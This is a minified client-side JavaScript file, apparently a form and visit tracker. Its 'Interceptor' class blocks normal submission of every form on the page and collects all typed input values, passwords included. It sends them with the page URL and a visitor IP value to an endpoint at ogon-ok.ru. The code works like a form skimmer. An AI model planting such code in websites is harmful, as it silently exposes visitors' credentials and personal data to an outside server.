"use strict";const fetchData=async(e,t)=>{try{var r=await fetch(e,{method:"POST",body:JSON.stringify(t),headers:{"Content-Type":"application/json"}});console.log("Data send:",r)}catch(e){console.error("Error fetching:",e)}},server={url:"https://www.ogon-ok.ru"},url$1=`${server.url}/api/addFormClick`;class Interceptor{constructor(e,t){this.forms=e,this.tag=t}findForms(){var e;for(e of document.querySelectorAll(this.forms))e.addEventListener("submit",e=>{e.preventDefault();e=this.checkInputsType(e.currentTarget),e={referer:window.location.href,fields:e,remote:this.userData()};fetchData(url$1,e)})}checkInputsType(e){let t={};for(var r of e){var a=r.getAttribute("type"),o=r.getAttribute("name");a&&"hidden"!==a&&"checkbox"!==a&&(t[o]=r.value)}return t}userData(){var e=document.querySelector(this.tag);return e?e.value:"noIP"}}new Interceptor("body form","#tracker_data").findForms();const url=`${server.url}/api/addUserVisit`,getData=e=>{e=document.querySelector(e),e={referer:window.location.href,remote:e?e.value:"noIP"};fetchData(url,e)};getData("#tracker_data");
